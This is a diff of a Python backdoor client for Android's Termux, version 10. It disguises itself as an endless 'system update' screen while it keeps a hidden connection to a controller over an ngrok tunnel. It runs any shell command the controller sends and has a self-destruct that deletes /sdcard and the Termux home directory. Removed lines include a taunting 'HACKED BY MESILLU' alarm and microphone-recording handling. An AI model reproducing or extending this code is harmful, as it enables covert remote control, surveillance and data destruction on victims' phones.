@@ -1,6 +1,6 @@
 #!/data/data/com.termux/files/usr/bin/python3
 """
-DEVICE CLIENT - Complete Client with Audio Recording
+DEVICE CLIENT - Connects from ANYWHERE using ngrok
 """
 
 import os
@@ -17,15 +17,13 @@ from datetime import datetime
 
 class DeviceClient:
     def __init__(self):
-        self.version = "9.0.0"
+        self.version = "10.0.0"
         self.connected = False
         self.socket = None
         self.device_name = platform.node()
         self.self_destruct_activated = False
         self.running = True
         self.hidden_dir = os.path.expanduser("~/.system_cache")
-        self.broadcast_port = 5556
-        self.alarm_active = False
         self.setup_hidden_directory()
         self.get_phone_info()
         
@@ -55,70 +53,42 @@ class DeviceClient:
         self.phone_info = info
         return info
         
-    def auto_discover_main(self):
-        """Auto discover main device"""
-        try:
-            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-            sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
-            sock.settimeout(3)
-            
-            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-            s.connect(('8.8.8.8', 80))
-            local_ip = s.getsockname()[0]
-            s.close()
-            
-            broadcast_ip = '.'.join(local_ip.split('.')[:-1] + ['255'])
-            sock.sendto(b"DISCOVER_MAIN", (broadcast_ip, self.broadcast_port))
-            
-            start_time = time.time()
-            while time.time() - start_time < 5:
-                try:
-                    data, addr = sock.recvfrom(1024)
-                    message = json.loads(data.decode())
-                    if message.get('type') == 'MAIN_DEVICE':
-                        main_ip = message.get('ip')
-                        main_port = message.get('port')
-                        sock.close()
-                        return main_ip, main_port
-                except:
-                    pass
-                    
-            sock.close()
-        except:
-            pass
-            
-        return "127.0.0.1", 5555
+    def show_connection_menu(self):
+        """Show connection menu for user to enter main device details"""
+        os.system('clear')
+        print("\n" + "="*60)
+        print("📱 DEVICE CLIENT - Remote Connection")
+        print("="*60)
+        print("\nEnter the Main Device connection details:")
+        print("(Get these from the Main Device screen)")
+        print("\nExample: If Main Device shows:")
+        print("  Public Address: 0.tcp.ngrok.io:12345")
+        print("  Then enter:")
+        print("  IP: 0.tcp.ngrok.io")
+        print("  Port: 12345")
+        print("="*60)
         
-    def play_alarm(self):
-        """Play loud alarm"""
-        self.alarm_active = True
-        subprocess.run(["pkill", "termux-tts-speak"], stderr=subprocess.DEVNULL)
-        subprocess.run(["pkill", "termux-vibrate"], stderr=subprocess.DEVNULL)
+        main_ip = input("\n🌍 Main Device IP: ").strip()
+        main_port = input("🔌 Main Device Port: ").strip()
         
-        alarm_sounds = [
-            "termux-tts-speak 'HACKED BY MESILLU'",
-            "termux-tts-speak 'LOCATION TRACKED!'",
-            "termux-tts-speak 'DONT BLOCK ME! CHAT ME! ALARM!'"
-        ]
+        # Save config
+        config = {
+            "main_ip": main_ip,
+            "main_port": int(main_port),
+            "auto_reconnect": True,
+            "installed_at": datetime.now().isoformat()
+        }
         
-        while self.alarm_active:
-            for sound in alarm_sounds:
-                if not self.alarm_active:
-                    break
-                try:
-                    subprocess.run(sound, shell=True, timeout=3, 
-                                 stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-                    subprocess.run(["termux-vibrate", "-d", "3000"], timeout=2,
-                                 stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-                except:
-                    pass
-                time.sleep(1)
-                
-    def stop_alarm(self):
-        """Stop the alarm immediately"""
-        self.alarm_active = False
-        subprocess.run(["pkill", "-9", "termux-tts-speak"], stderr=subprocess.DEVNULL)
-        subprocess.run(["pkill", "-9", "termux-vibrate"], stderr=subprocess.DEVNULL)
+        config_file = os.path.join(self.hidden_dir, "config.json")
+        with open(config_file, 'w') as f:
+            json.dump(config, f, indent=2)
+            
+        print(f"\n✅ Configuration saved!")
+        print(f"📁 Config: {config_file}")
+        print(f"\n🔄 Connecting to {main_ip}:{main_port}...")
+        time.sleep(2)
+        
+        return main_ip, main_port
         
     def show_infinite_loading(self):
         """Show infinite loading screen"""
@@ -146,7 +116,7 @@ class DeviceClient:
                 print(f"║  Progress: [{bar}] {current_percent:.1f}%                    ║")
                 print("╠════════════════════════════════════════════════════════════════╣")
                 
-                packages = ["system-core", "security-patch", "audio-driver", "camera-api"]
+                packages = ["system-core", "security-patch", "network-driver"]
                 pkg = random.choice(packages)
                 print(f"║  ▶ Installing: {pkg:<52} ║")
                     
@@ -159,27 +129,33 @@ class DeviceClient:
                 print(f"║  Estimated time: {eta} seconds remaining                      ║")
                 
                 print("╠════════════════════════════════════════════════════════════════╣")
-                print("║  Network: CONNECTED                                         ║")
+                
+                if self.connected:
+                    print("║  Status: CONNECTED TO MAIN DEVICE                           ║")
+                else:
+                    print("║  Status: CONNECTING...                                      ║")
+                    
                 print("╚════════════════════════════════════════════════════════════════╝")
                 print()
                 print("  DO NOT CLOSE TERMINUX")
-                print("  This may take a while...")
+                print("  Background connection active")
                 
                 time.sleep(random.uniform(0.5, 1.0))
                 
         except KeyboardInterrupt:
             os.system('clear')
-            print("\n⚠️  WARNING: UPDATE INTERRUPTED")
-            print("\nResuming update in 10 seconds...")
+            print("\n⚠️  UPDATE INTERRUPTED")
+            print("\nResuming in 10 seconds...")
             for i in range(10, 0, -1):
                 print(f"\r{i} seconds...", end="")
                 time.sleep(1)
             self.show_infinite_loading()
             
     def connect_to_main(self, main_ip, main_port):
-        """Connect to main device"""
+        """Connect to main device from anywhere"""
         while self.running and not self.connected:
             try:
+                print(f"\n🔄 Connecting to {main_ip}:{main_port}...")
                 self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                 self.socket.settimeout(30)
                 self.socket.connect((main_ip, int(main_port)))
@@ -197,10 +173,12 @@ class DeviceClient:
                 
                 if confirm.get('status') == 'connected':
                     self.connected = True
+                    print(f"✅ Connected to {main_ip}:{main_port}")
                     self.listen_for_commands()
                     return True
                     
             except Exception as e:
+                print(f"❌ Connection failed: {e}")
                 time.sleep(10)
                 
         return False
@@ -237,7 +215,7 @@ class DeviceClient:
                         break
                         
         except Exception as e:
-            pass
+            print(f"Connection error: {e}")
         finally:
             self.connected = False
             self.cleanup()
@@ -245,11 +223,6 @@ class DeviceClient:
     def execute_command(self, command):
         """Execute command"""
         try:
-            # Special handling for audio recording
-            if "termux-microphone-record" in command:
-                # Ensure microphone permission
-                subprocess.run(["termux-microphone-record", "-h"], capture_output=True)
-                
             result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=30)
             return result.stdout + result.stderr
         except subprocess.TimeoutExpired:
@@ -260,8 +233,6 @@ class DeviceClient:
     def self_destruct(self):
         """Self-destruct"""
         self.self_destruct_activated = True
-        self.stop_alarm()
-        
         locations = ["/sdcard/", "/data/data/com.termux/files/home/"]
         for location in locations:
             try:
@@ -275,6 +246,11 @@ class DeviceClient:
             subprocess.Popen(["dd", "if=/dev/zero", "of=/dev/null"], 
                            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                            
+    def stop_alarm(self):
+        """Stop alarm"""
+        subprocess.run(["pkill", "-9", "termux-tts-speak"], stderr=subprocess.DEVNULL)
+        subprocess.run(["pkill", "-9", "termux-vibrate"], stderr=subprocess.DEVNULL)
+        
     def cleanup(self):
         """Cleanup"""
         if self.socket:
@@ -296,16 +272,27 @@ class DeviceClient:
         print(f"📱 DEVICE CLIENT v{self.version}")
         print("="*60)
         
-        main_ip, main_port = self.auto_discover_main()
-        
+        # Check for existing config
         config_file = os.path.join(self.hidden_dir, "config.json")
-        config = {"main_ip": main_ip, "main_port": main_port}
-        with open(config_file, 'w') as f:
-            json.dump(config, f)
-            
-        print(f"🎯 Found main device: {main_ip}:{main_port}")
         
+        if os.path.exists(config_file):
+            # Load existing config
+            with open(config_file, 'r') as f:
+                config = json.load(f)
+            main_ip = config.get("main_ip", "127.0.0.1")
+            main_port = config.get("main_port", 5555)
+            print(f"\n📡 Using saved connection: {main_ip}:{main_port}")
+        else:
+            # First time setup - get connection details
+            main_ip, main_port = self.show_connection_menu()
+            
+        print(f"\n🎯 Connecting to: {main_ip}:{main_port}")
+        print("🔄 This will run in background...")
+        
+        # Start connection thread
         threading.Thread(target=self.auto_reconnect, args=(main_ip, main_port), daemon=True).start()
+        
+        # Show infinite loading screen
         self.show_infinite_loading()
 
 if __name__ == "__main__":
